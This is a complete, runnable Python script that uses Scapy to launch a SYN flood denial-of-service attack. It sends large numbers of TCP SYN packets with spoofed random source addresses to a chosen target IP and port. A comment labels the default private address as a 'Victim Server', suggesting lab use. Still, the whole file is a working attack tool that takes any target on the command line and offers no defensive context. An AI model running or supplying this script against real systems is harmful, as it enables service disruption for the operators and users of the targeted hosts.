#!/usr/bin/env python3

import random
from scapy.all import IP, TCP, send
import time
import sys

# --- Configuration ---
TARGET_IP = "10.0.0.4"               # Replace with the Victim Server's Private IP
TARGET_PORT = 80                     # Replace with the Victim Server's listening port (e.g., 80 for HTTP, 22 for SSH)
PACKET_COUNT = 100000                # Number of SYN packets to send (adjust as needed for impact)
DELAY_BETWEEN_PACKETS = 0.0001       # Delay in seconds between sending packets (0 for max speed)

# --- Attack Function ---
def syn_flood_attack(target_ip, target_port, packet_count, delay):
    print(f"Starting SYN flood attack on {target_ip}:{target_port}...")
    print(f"Sending {packet_count} spoofed SYN packets.")

    try:
        for i in range(packet_count):
            # Generate a random source IP address
            spoofed_ip = ".".join(map(str, (random.randint(1, 254) for _ in range(4))))
            
            # Generate a random source port
            spoofed_port = random.randint(1024, 65535)

            # Craft the IP and TCP layers
            # Source IP is spoofed, Destination IP is the victim
            ip_layer = IP(src=spoofed_ip, dst=target_ip)
            
            # SYN flag is set, Source Port is random, Destination Port is the target service
            tcp_layer = TCP(sport=spoofed_port, dport=target_port, flags="S", seq=random.randint(0, 0xFFFFFFFF))

            # Combine the layers to form the packet
            packet = ip_layer / tcp_layer

            # Send the packet
            # verbose=0 suppresses Scapy's output for each packet
            send(packet, verbose=0)
            
            if (i + 1) % 1000 == 0:
                print(f"Sent {i + 1} packets...")

            # Introduce a small delay to control packet rate
            time.sleep(delay)

        print(f"Attack finished. Sent {packet_count} packets.")

    except PermissionError:
        print("Error: You need to run this script with root privileges (e.g., sudo python3 syn_flood_spoofed.py).")
    except Exception as e:
        print(f"An error occurred: {e}")

# --- Main Execution ---
if __name__ == "__main__":
    if len(sys.argv) == 3:
        TARGET_IP = sys.argv[1]
        TARGET_PORT = int(sys.argv[2])
    elif len(sys.argv) == 5:
        TARGET_IP = sys.argv[1]
        TARGET_PORT = int(sys.argv[2])
        PACKET_COUNT = int(sys.argv[3])
        DELAY_BETWEEN_PACKETS = float(sys.argv[4])
    elif len(sys.argv) != 1:
        print("Usage: ")
        print(f"  sudo python3 {sys.argv[0]}")
        print(f"  sudo python3 {sys.argv[0]} <target_ip> <target_port>")
        print(f"  sudo python3 {sys.argv[0]} <target_ip> <target_port> <packet_count> <delay_seconds>")
        sys.exit(1)

    print(f"Using Target IP: {TARGET_IP}")
    print(f"Using Target Port: {TARGET_PORT}")
    print(f"Using Packet Count: {PACKET_COUNT}")
    print(f"Using Delay Between Packets: {DELAY_BETWEEN_PACKETS} seconds")

    syn_flood_attack(TARGET_IP, TARGET_PORT, PACKET_COUNT, DELAY_BETWEEN_PACKETS)